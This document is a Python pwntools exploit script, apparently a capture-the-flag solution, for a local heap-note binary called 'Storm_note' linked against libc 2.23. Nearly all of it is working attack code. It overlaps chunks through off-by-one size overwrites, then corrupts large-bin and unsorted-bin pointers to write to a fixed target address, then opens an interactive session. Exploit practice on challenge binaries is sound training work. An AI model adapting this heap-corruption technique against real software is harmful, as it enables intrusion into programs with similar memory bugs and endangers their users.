from pwn import *
context.log_level = 'debug'
prog = './Storm_note'
elf = ELF(prog)
p = process(prog)

libc = ELF("./libc-2.23.so")
#p = remote("")
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size):
	p.sendlineafter("Choice: ", '1')
	p.sendlineafter("size ?\n", str(size))

def edit(idx, content):
	p.sendlineafter("Choice: ", '2')
	p.sendlineafter("Index ?\n", str(idx))
	p.sendafter("Content: \n", content)
def free(idx):
	p.sendlineafter("Choice: ", '3')
	p.sendlineafter("Index ?\n", str(idx))
def exp():

	add(0x80)#0
	add(0x518)#1  0a0
	add(0x100)#2
	free(0)
	edit(1, 'a'*0x510+p64(0x5b0))
	edit(2, 'a'*0xf0+p64(0)+p64(0x11))
	free(2)
	add(0x6a0)#0    010
	edit(0, 'a'*0x80+p64(0)+p64(0x521)+'\x00'*0x518+p64(0x111))
	
	add(0x80)#2 
	add(0x528)#3
	add(0x100)#4
	free(2)
	edit(3, 'a'*0x520+p64(0x5c0))
	edit(4, 'a'*0xf0+p64(0)+p64(0x11))
	free(4)
	add(0x6b0)
	edit(2, 'a'*0x80+p64(0)+p64(0x531)+'\x00'*0x528+p64(0x111))
	
	free(1)
	add(0x520)
	free(3)
	
	
	target = 0xABCD0100-0x10
	edit(2, 'a'*0x80+p64(0)+p64(0x531)+p64(0)+p64(target))
	edit(0, 'a'*0x80+p64(0)+p64(0x521)+p64(0)+p64(target+8)+p64(0)+p64(target-0x18-5))
	add(0x48)
	edit(3, 'a'*0x30)
	p.sendlineafter("Choice: ", '6')
	p.sendline("a"*0x30)
	'''
	log.info("libc.address ==> " + hex(libc.address))
	'''
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
